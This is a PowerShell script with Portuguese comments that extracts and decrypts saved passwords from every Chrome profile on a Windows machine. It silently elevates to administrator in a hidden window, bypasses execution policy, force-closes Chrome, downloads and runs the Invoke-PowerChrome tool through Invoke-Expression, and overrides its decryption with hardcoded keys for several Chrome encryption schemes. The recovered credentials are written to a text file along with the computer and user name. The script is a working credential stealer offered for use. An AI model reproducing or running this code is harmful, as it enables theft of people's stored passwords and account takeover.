# =====================================================================
# ExtrairSenhas.ps1 - Versão DEFINITIVA
# Corrige: Invoke-PowerChrome desatualizado (flags 1/2 não suportados)
# Corrige: Suporte a múltiplos perfis (Default, Profile 1, etc.)
# Corrige: Captura de saída (Format-Table → Out-String)
# =====================================================================

# --- Elevação de privilégios ---
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

# --- Configuração ---
$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
$datahora       = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida   = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

# --- Fecha o Chrome ---
Get-Process "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 3

# =====================================================================
# PASSO 1: Baixa e carrega o Invoke-PowerChrome original
# =====================================================================
$scriptUrl = 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1'
try {
    $scriptContent = (Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing).Content
    Invoke-Expression $scriptContent
    Write-Host "[+] Invoke-PowerChrome carregado com sucesso"
} catch {
    Write-Host "[-] Erro ao baixar Invoke-PowerChrome: $($_.Exception.Message)"
    exit 1
}

# =====================================================================
# PASSO 2: Sobrescreve a função Decrypt-ChromeKeyBlob
#          para suportar flags 1 (Chrome 137+), 2 (Chrome 133-136), 3 (Chrome 127-132)
# =====================================================================
function Decrypt-ChromeKeyBlob {
    param($ParsedData)

    $flag = $ParsedData.Flag
    Write-Host "[*] Flag de criptografia detectado: $flag"

    if ($flag -eq 1) {
        # Chrome 137+: AES-256-GCM com chave hardcoded do elevation_service.exe
        Write-Host "[*] Usando descriptografia Flag 1 (Chrome 137+ AES-256-GCM)"
        [byte[]]$AesKey = @(
            0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,
            0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,
            0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,
            0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87
        )
        return DecryptWithAesGcm -Key $AesKey -Iv $ParsedData.Iv -Ciphertext $ParsedData.Ciphertext -Tag $ParsedData.Tag
    }
    elseif ($flag -eq 2) {
        # Chrome 133-136: ChaCha20-Poly1305 com chave hardcoded
        Write-Host "[*] Usando descriptografia Flag 2 (Chrome 133-136 ChaCha20-Poly1305)"
        [byte[]]$ChaChaKey = @(
            0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,
            0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,
            0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,
            0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60
        )

        # ChaCha20-Poly1305 via .NET 8+ ou Python fallback
        $iv = $ParsedData.Iv
        $ciphertext = $ParsedData.Ciphertext
        $tag = $ParsedData.Tag

        # Tenta .NET ChaCha20Poly1305 (disponível no .NET 8+)
        $dotnetSuccess = $false
        try {
            $chacha = [System.Security.Cryptography.ChaCha20Poly1305]::new($ChaChaKey)
            $plaintext = New-Object byte[] $ciphertext.Length
            $chacha.Decrypt($iv, $ciphertext, $tag, $plaintext)
            $chacha.Dispose()
            $dotnetSuccess = $true
            return $plaintext
        } catch {
            Write-Host "[*] .NET ChaCha20 não disponível, tentando Python..."
        }

        if (-not $dotnetSuccess) {
            # Fallback: Python com cryptography
            $combined = New-Object byte[] ($ciphertext.Length + $tag.Length)
            [Array]::Copy($ciphertext, 0, $combined, 0, $ciphertext.Length)
            [Array]::Copy($tag, 0, $combined, $ciphertext.Length, $tag.Length)

            $keyHex  = ($ChaChaKey | ForEach-Object { $_.ToString("x2") }) -join ''
            $ivHex   = ($iv | ForEach-Object { $_.ToString("x2") }) -join ''
            $dataHex = ($combined | ForEach-Object { $_.ToString("x2") }) -join ''

            $pyCode = "from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305; import sys, binascii; k=binascii.unhexlify('$keyHex'); n=binascii.unhexlify('$ivHex'); d=binascii.unhexlify('$dataHex'); c=ChaCha20Poly1305(k); r=c.decrypt(n,d,None); sys.stdout.buffer.write(binascii.hexlify(r))"

            $pythonExe = $null
            foreach ($p in @("python", "python3", "py")) {
                try {
                    $testResult = & $p --version 2>&1
                    if ($testResult -match "Python") { $pythonExe = $p; break }
                } catch {}
            }

            if (-not $pythonExe) {
                throw "Python não encontrado. Necessário para Chrome 133-136 (ChaCha20-Poly1305)."
            }

            & $pythonExe -m pip install cryptography --quiet 2>$null
            $hexResult = & $pythonExe -c $pyCode 2>&1
            if ($LASTEXITCODE -ne 0) {
                throw "Python ChaCha20 decryption falhou: $hexResult"
            }

            $resultBytes = New-Object byte[] ($hexResult.Length / 2)
            for ($i = 0; $i -lt $resultBytes.Length; $i++) {
                $resultBytes[$i] = [Convert]::ToByte($hexResult.Substring($i * 2, 2), 16)
            }
            return $resultBytes
        }
    }
    elseif ($flag -eq 3) {
        # Chrome 127-132: XOR + NCrypt (versão original do Invoke-PowerChrome)
        Write-Host "[*] Usando descriptografia Flag 3 (Chrome 127-132 XOR+NCrypt)"
        [byte[]]$XorKey = HexToBytes "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"

        Invoke-Impersonate > $null
        try {
            [byte[]]$DecryptedAesKey = DecryptWithNCrypt -InputData $ParsedData.EncryptedAesKey
            $XoredAesKey = XorBytes -FirstArray $DecryptedAesKey -SecondArray $XorKey
            return DecryptWithAesGcm -Key $XoredAesKey -Iv $ParsedData.Iv -Ciphertext $ParsedData.Ciphertext -Tag $ParsedData.Tag
        }
        finally {
            [void][Advapi32]::RevertToSelf()
        }
    }
    else {
        throw "Flag não suportado: $flag"
    }
}

# =====================================================================
# PASSO 3: Função para extrair de um perfil específico
#          Usa o truque de trocar $env:LOCALAPPDATA temporariamente
# =====================================================================
function Extrair-Perfil {
    param(
        [string]$PerfilNome,
        [string]$PerfilCaminho,
        [string]$ChromeUserDataRoot
    )

    Write-Host "`n[*] =========================================="
    Write-Host "[*] Processando perfil: $PerfilNome"
    Write-Host "[*] Caminho: $PerfilCaminho"
    Write-Host "[*] =========================================="

    $loginDataFile = Join-Path $PerfilCaminho "Login Data"
    if (-not (Test-Path $loginDataFile)) {
        Write-Host "[-] Login Data não encontrado em: $loginDataFile"
        return "[PERFIL: $PerfilNome] Sem dados de login.`n"
    }

    # Cria um diretório temporário que simula a estrutura esperada pelo Invoke-PowerChrome
    $tempDir   = Join-Path $env:TEMP "ChromeExtract_$([Guid]::NewGuid())"
    $targetDir = Join-Path $tempDir "Google\Chrome\User Data\Default"
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null

    try {
        # Copia Login Data do perfil para o "Default" fake
        Copy-Item -LiteralPath $loginDataFile -Destination (Join-Path $targetDir "Login Data") -Force

        # Copia Local State para o local esperado
        $localStateSource = Join-Path $ChromeUserDataRoot "Local State"
        $localStateDest   = Join-Path $tempDir "Google\Chrome\User Data\Local State"
        if (Test-Path $localStateSource) {
            Copy-Item -LiteralPath $localStateSource -Destination $localStateDest -Force
        } else {
            Write-Host "[-] Local State não encontrado: $localStateSource"
            return "[PERFIL: $PerfilNome] Local State não encontrado.`n"
        }

        # Troca LOCALAPPDATA temporariamente para apontar para o diretório fake
        $oldLocalAppData = $env:LOCALAPPDATA
        $env:LOCALAPPDATA = $tempDir

        # Executa o Invoke-PowerChrome e captura a saída corretamente
        # O | Out-String resolve o problema do Format-Table retornando objetos FormatData
        $resultado = Invoke-PowerChrome -Browser Chrome -Verbose -HideBanner 2>&1 | Out-String

        # Restaura LOCALAPPDATA
        $env:LOCALAPPDATA = $oldLocalAppData

        $header = "=== PERFIL: $PerfilNome ===`n"
        return "$header$resultado`n"
    }
    catch {
        $env:LOCALAPPDATA = $oldLocalAppData
        $errMsg = "[-] Erro no perfil $PerfilNome : $($_.Exception.Message)"
        Write-Host $errMsg
        return "[PERFIL: $PerfilNome] ERRO: $($_.Exception.Message)`n"
    }
    finally {
        # Limpa o diretório temporário
        if (Test-Path $tempDir) {
            Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# =====================================================================
# PASSO 4: Execução principal - Itera por todos os perfis
# =====================================================================

$chromeUserDataRoot = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"

$outputBuilder = New-Object System.Text.StringBuilder
[void]$outputBuilder.AppendLine("==============================================")
[void]$outputBuilder.AppendLine(" Extrator de Senhas Chrome - Versão Corrigida")
[void]$outputBuilder.AppendLine(" Suporte: Chrome 127+ (flags 1/2/3)")
[void]$outputBuilder.AppendLine(" Data: $datahora")
[void]$outputBuilder.AppendLine(" Computador: $env:COMPUTERNAME")
[void]$outputBuilder.AppendLine(" Usuário: $env:USERNAME")
[void]$outputBuilder.AppendLine("==============================================")
[void]$outputBuilder.AppendLine("")

if (-not (Test-Path $chromeUserDataRoot)) {
    $msg = "[-] Diretório do Chrome não encontrado: $chromeUserDataRoot"
    Write-Host $msg
    [void]$outputBuilder.AppendLine($msg)
    $outputBuilder.ToString() | Out-File -FilePath $arquivoSaida -Encoding UTF8
    exit
}

# Coleta todos os perfis que possuem Login Data
$perfis = @()

# Perfil Default
$defaultPath = Join-Path $chromeUserDataRoot "Default"
if (Test-Path (Join-Path $defaultPath "Login Data")) {
    $perfis += [PSCustomObject]@{ Nome = "Default"; Caminho = $defaultPath }
}

# Perfis adicionais (Profile 1, Profile 2, etc.)
Get-ChildItem -Path $chromeUserDataRoot -Directory | Where-Object {
    $_.Name -like "Profile*" -and (Test-Path (Join-Path $_.FullName "Login Data"))
} | Sort-Object Name | ForEach-Object {
    $perfis += [PSCustomObject]@{ Nome = $_.Name; Caminho = $_.FullName }
}

Write-Host "[*] Encontrados $($perfis.Count) perfis com dados de login"
[void]$outputBuilder.AppendLine("[*] Total de perfis encontrados: $($perfis.Count)")
[void]$outputBuilder.AppendLine("")

foreach ($perfil in $perfis) {
    $resultado = Extrair-Perfil -PerfilNome $perfil.Nome -PerfilCaminho $perfil.Caminho -ChromeUserDataRoot $chromeUserDataRoot
    [void]$outputBuilder.AppendLine($resultado)
}

# Salva o resultado final
$outputBuilder.ToString() | Out-File -FilePath $arquivoSaida -Encoding UTF8

Write-Host "`n=============================================="
Write-Host " Processo concluído!"
Write-Host " Arquivo salvo em: $arquivoSaida"
Write-Host "=============================================="
Start-Sleep -Seconds 3
exit
